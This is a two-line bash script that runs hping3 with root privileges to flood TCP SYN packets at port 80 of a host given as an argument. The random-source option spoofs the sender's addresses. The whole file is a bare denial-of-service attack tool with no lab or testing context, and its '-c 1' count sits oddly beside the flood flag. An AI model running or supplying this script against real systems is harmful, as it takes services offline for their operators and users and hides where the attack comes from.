#!/bin/bash
sudo hping3 --flood --rand-source -S -p 80 -c 1 "$1"
